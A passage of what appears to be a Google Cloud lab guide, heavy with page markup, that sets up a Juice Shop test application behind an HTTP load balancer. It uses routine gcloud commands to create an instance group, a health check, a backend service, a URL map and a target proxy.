</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IP  EXTERNAL_IP &nbsp; &nbsp; STATUS</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">10.0.0.3 &nbsp; &nbsp; &lt;public ip=""&gt; &nbsp; &nbsp; RUNNING</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/public&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Set up the test application</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='set-up-the-cloud-load-balancer-component-instance-group'><span>Set up the Cloud load balancer component: instance group</span></h3><ol start='' ><li><p><span>In Cloud Shell, enter the following command to create the unmanaged instance group:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instance-groups unmanaged create Instance Group \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --zone=Zone</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp;  LOCATION &nbsp; &nbsp; &nbsp; SCOPE  NETWORK  MANAGED  INSTANCES</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Instance Group  Zone  zone &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 0</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>Add the Juice Shop Google Compute Engine (GCE) instance to the unmanaged instance group:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instance-groups unmanaged add-instances Instance Group \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --zone=Zone \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  --instances=VM Instance</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Updated [https://www.googleapis.com/compute/v1/projects/&lt;project name=""&gt;/zones/Zone/instanceGroups/Instance_Group].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/project&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><ol start='' ><li><p><span>Set the named port to that of the Juice Shop application:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instance-groups unmanaged set-named-ports \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Instance Group \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; --named-ports=http:3000 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; --zone=Zone</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Updated [https://www.googleapis.com/compute/v1/projects/&lt;project name=""&gt;/zones/Zone/instanceGroups/Instance Group].</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;/project&gt;</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Set up the Cloud load balancer component- instance group</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='set-up-the-cloud-load-balancer-component-health-check'><span>Set up the Cloud load balancer component: health check</span></h3><p><span>Now that you&#39;ve created the unmanaged instance group, create a health check, backend service, URL map, target proxy, and forwarding rule.</span></p><ul><li><p><span>In Cloud Shell, enter the following command to create the health-check for the Juice Shop service port:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute health-checks create tcp tcp-port-3000 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --port 3000</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Created</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; PROTOCOL</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tcp-port-3000  TCP</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><h3 id='set-up-the-cloud-load-balancer-component-backend-service'><span>Set up the Cloud load balancer component: backend service</span></h3><ol start='' ><li><p><span>In Cloud Shell, enter the following command to create the backend service parameters:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute backend-services create juice-shop-backend \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --protocol HTTP \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --port-name http \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --health-checks tcp-port-3000 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --enable-logging \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --global</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  BACKENDS  PROTOCOL</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">juice-shop-backend &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  HTTP</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><ol start='' ><li><p><span>Add the Juice Shop instance group to the backend service:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> gcloud compute backend-services add-backend juice-shop-backend \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --instance-group=Instance Group \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --instance-group-zone=Zone \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --global</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Updated [https://www.googleapis.com/compute/v1/projects/cythom-host1/global/backendServices/juice-shop-backend].</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><h3 id='set-up-the-cloud-load-balancer-component-url-map'><span>Set up the Cloud load balancer component: URL map</span></h3><ul><li><p><span>In Cloud Shell, enter the following command to create the URL map to send incoming requests to the backend:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute url-maps create juice-shop-loadbalancer \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp;  --default-service juice-shop-backend</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Output:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; DEFAULT_SERVICE</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">juice-shop-loadbalancer  backendServices/juice-shop-backend</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><h3 id='set-up-the-cloud-load-balancer-component-target-proxy'><span>Set up the Cloud load balancer component: target proxy</span></h3><ul><li><p><span>In Cloud Shell, enter the following command to create the Target Proxy to route incoming requests the URL map:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" 